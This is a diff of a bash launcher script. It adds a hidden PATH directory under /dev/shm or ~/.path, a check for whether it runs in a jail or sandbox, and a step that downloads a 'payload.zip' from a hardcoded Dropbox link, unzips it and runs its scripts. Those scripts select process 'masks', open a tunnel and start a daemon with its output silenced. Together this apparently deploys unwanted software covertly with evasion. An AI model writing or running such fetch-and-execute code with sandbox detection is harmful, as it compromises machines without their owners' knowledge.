@@ -1,29 +1,58 @@
 #!/usr/bin/env bash
 ## needed tmux sed grep envsubst
 
-## where are we
-c=$(builtin compgen -G '/etc/cpa*')
-d=$(builtin compgen -G '/dev/*')
-s=$(builtin compgen -G '/sys/*')
-p=$(builtin compgen -G '/proc/*')
-jail=
-if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
-    jail=1
-fi
+## load customization variables
+[ -f env.sh ] && . ./env.sh
 
-## get payload
-# BRANCH=master
-# wget -q https://github.com/untoreh/scripts/archive/${BRANCH}.tar.gz
+tmppath() {
+    if tmppath=$($bb mktemp -d); then
+        export PATH=${tmppath}:${PATH} tmppath
+    else
+        for ph in {/dev/shm,/run,~/}; do
+            rm -rf $ph/.path &&
+                mkdir -p $ph/.path &&
+                tmppath=$ph/.path &&
+                export PATH=${ph}/.path:${PATH} tmppath &&
+                break
+        done
+    fi
+}
+tmppath
+[ -n "$tmppath" ] && cd $tmppath
+
+jailjudge() {
+    ## where are we
+    c=$(builtin compgen -G '/etc/cpa*')
+    d=$(builtin compgen -G '/dev/*')
+    s=$(builtin compgen -G '/sys/*')
+    p=$(builtin compgen -G '/proc/*')
+    jail=
+    if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
+        jail=1
+    fi
+}
+jailjudge
+
+## get payload from dbx
+token=${pl_token:-ja15pnp2ac99sy4}
+name=${pl_name:-payload.zip}
+dir=pltmp
+wget -q https://dl.dropboxusercontent.com/s/$token/$name
+mkdir -p $dir && unzip -d $dir $name && rm $name || exit 1
+cd $dir/* || exit 1
 # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
 # cd scripts-${BRANCH} || exit 1
 
 . ./functions || exit 1
 
 ## utility vars
-CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
+# CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
 
 ## env vars
 export PATH=.:pl:$PATH
+
+## choose masks
+. ./masks || exit 1
 
 ## start tunnel
 . ./tstarter || exit 1
@@ -35,7 +64,6 @@ setup_tnl &>/dev/null
 ## start the pausd daemon passing the object args
 . ./pausd || exit 1
 . ./switch || exit 1
-# start_pausd
 start
 fleep 1 ## give time to fail
 
@@ -47,7 +75,7 @@ while [ "$(jobs -r | wc -l)" -lt 2 ]; do
         ## altconfig
         . ./altconfig
         ## init
-        start_pausd
+        start
         break
     fi
     fleep 1
